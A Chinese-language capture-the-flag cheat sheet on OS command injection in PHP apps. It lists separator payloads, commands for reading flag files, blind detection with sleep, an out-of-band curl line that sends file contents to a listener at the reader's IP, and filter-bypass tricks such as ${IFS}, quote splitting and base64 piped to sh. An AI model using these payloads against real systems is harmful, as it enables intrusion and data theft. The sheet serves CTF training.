# 命令注入速查（照着做就能把题做完）

> 用法：做题不记得了 → 翻到对应知识点 → 照着 payload 改

========================================================
## 0. 拿到题先走这个流程
========================================================

```
1. 读源码：找 system/exec/shell_exec/passthru/反引号 + 参数拼接 → 这就是注入点
2. 试分隔符：;id 或 |id 或 %0aid，看有没有输出 uid=...
3. 有回显 → 直接读 flag 文件
4. 无回显 → sleep 验证 → OOB 带出
5. 被过滤 → 查第 3 节绕过表
```

---

========================================================
## 1. 分隔符全家桶（一条命令变两条）
========================================================

| 符号 | 含义 | 示例 |
|------|------|------|
| ; | 顺序执行（不管成败） | 127.0.0.1;id |
| && | 前面成功才执行 | 127.0.0.1&&id |
| || | 前面失败才执行 | 127.0.0.1||id |
| | | 管道（前输出喂给后） | 127.0.0.1|id |
| %0a | 换行（=分号，URL编码） | 127.0.0.1%0aid |
| `cmd` / $(cmd) | 命令替换（先执行，结果当文本；不需要分隔符！） | echo `id` |
| & | 后台执行 | 127.0.0.1&id |

**URL 编码**：; → %3B，空格 → %20，| → %7C，' → %27

========================================================
## 2. 完整做题流程
========================================================

**① 确认注入（有回显）**：
```bash
ip=127.0.0.1;id          -- 出现 uid=33(www-data)... = 注入成功
ip=127.0.0.1;whoami      -- 当前用户
ip=127.0.0.1;ls /        -- 列根目录
```

**② 读 flag**：
```bash
ip=127.0.0.1;cat /flag.txt
ip=127.0.0.1;cat /f*             -- 通配符（不确定文件名）
ip=127.0.0.1;tac /flag.txt       -- tac = 倒序输出（cat 被禁时）
```

**③ 无回显（页面什么都不显示）**：
```bash
-- 时间验证：页面卡住 = 命令执行了
ip=127.0.0.1;sleep 5

-- 带外 OOB：把数据发到你的服务器（本机监听 nc -lvnp 8888）
ip=127.0.0.1;curl http://你的IP:8888/$(cat /flag.txt)
```

========================================================
## 3. 绕过速查（拦什么换什么）
========================================================

| 被拦 | 绕过 | 例子 |
|------|------|------|
| 空格 | ${IFS} | cat${IFS}/flag.txt |
| 空格 | $IFS$9 | cat$IFS$9/flag.txt |
| 空格 | %09（Tab） | cat%09/flag.txt |
| 空格 | 重定向输入 | cat</flag.txt |
| cat | tac / head / tail / more / less / nl / sed | tac /flag.txt |
| flag 关键字 | 通配符 | cat /fla* |
| cat/flag | 引号拆开 | c""at /fla\g* |
| 关键字 | 变量拼接 | 先 f=fl;ag 再 cat $f |
| 分隔符全拦 | 命令替换（不需要分隔符） | `cat /flag.txt` 或 $(cat /flag.txt) |
| 关键字 | base64 编码执行 | echo Y2F0IC9mbGFnLnR4dA== | base64 -d | sh |

**坑**：${IFS} 在 bash/dash 都可用；{cat,/flag.txt} 花括号展开是 bash 专属（PHP 的 sh 是 dash，用不了）

========================================================
## 4. 危险函数速查（读源码时对照）
========================================================

| PHP 函数 | 执行命令 | 有回显？ |
|----------|----------|----------|
| system() | ✅ | ✅ 直接输出 |
| passthru() | ✅ | ✅ 直接输出（二进制友好） |
| exec() | ✅ | ❌ 只返回最后一行，要自己 echo |
| shell_exec() | ✅ | ❌ 返回全部输出，要自己 echo |
| 反引号 `` `cmd` `` | ✅ | ❌ 等价 shell_exec |
| popen() / proc_open() | ✅ | 返回句柄自己读 |

**PHP 读输入**：$_GET['x'] / $_POST['x'] / $_SERVER['HTTP_XXX']

========================================================
## 5. 报错导航
========================================================

| 报错/现象 | 意思 | 怎么办 |
|-----------|------|--------|
| sh: id: not found | 命令不存在（环境没这个命令） | 换 ls / whoami 试试 |
| 页面卡住 N 秒 | sleep 生效 = 注入存在 | 用时间盲注 |
| 什么都没输出 | 无回显（函数不输出） | 用 sleep 验证 + OOB |
| 输入被过滤提示 | 有黑名单 | 查第 3 节绕过表 |

---

## 心法

> 先读源码找危险函数 ｜ 分隔符挨个试 ｜ 拦什么换什么 ｜ 无回显就 sleep
